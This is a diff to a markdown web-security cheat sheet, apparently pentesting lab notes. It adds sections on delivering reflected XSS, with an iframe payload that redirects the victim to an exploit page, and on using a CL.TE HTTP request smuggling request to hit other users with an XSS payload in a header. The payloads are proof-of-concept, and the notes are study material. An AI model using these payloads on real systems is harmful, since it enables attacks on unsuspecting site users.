@@ -446,6 +446,8 @@ CSRF way to write the password + username in the comment section:
 
 ### Deliver Exploit
 
+#### Send user to a malicious website
+
 When an event isn't required:
 
 ```html
@@ -464,6 +466,30 @@ When u need to redirect twice the user:
 
 ```html
 <iframe src="https://vuln-catalog/product?productId=1&'><script>print()</script>" onload="location='https://vuln-catalog/exploit'"></iframe>
+```
+
+#### using http request smuggling
+
+[-> smuggling cheat sheet](/web/server-side/request-smuggling.md)
+
+If an application is vulnerable to HTTP request smuggling and also contains reflected XSS, you can use a request smuggling attack to hit other users of the application. This approach is superior to normal exploitation of reflected XSS in two ways:
+
+- It requires no interaction with victim users. You don't need to feed them a URL and wait for them to visit it. You just smuggle a request containing the XSS payload and the next user's request that is processed by the back-end server will be hit.
+- It can be used to exploit XSS behavior in parts of the request that cannot be trivially controlled in a normal reflected XSS attack, such as HTTP request headers.
+
+Request exploiting CL.TE:
+
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 63
+Transfer-Encoding: chunked
+
+0
+
+GET / HTTP/1.1
+User-Agent: <script>alert(1)</script>
+Foo: X
 ```
 
 ## Dangling markup injection
